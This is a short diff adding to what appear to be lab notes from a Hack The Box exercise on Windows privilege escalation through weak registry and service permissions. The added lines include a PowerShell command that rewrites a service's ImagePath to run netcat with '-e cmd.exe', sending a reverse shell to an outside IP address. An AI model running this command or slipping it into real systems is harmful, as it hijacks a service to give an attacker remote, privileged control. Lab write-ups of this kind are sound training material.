@@ -16,4 +16,12 @@ RW HKCR\WOW6432Node\CLSID\{23170F69-40C1-278A-1000-000100020000}
         KEY_ALL_ACCESS
 RW HKCR\WOW6432Node\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
         KEY_ALL_ACCESS
+
+# hklm\System\CurrentControlSet\services to check services.
+
+```
+
+Changing the value
+```powershell
+PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
 ```
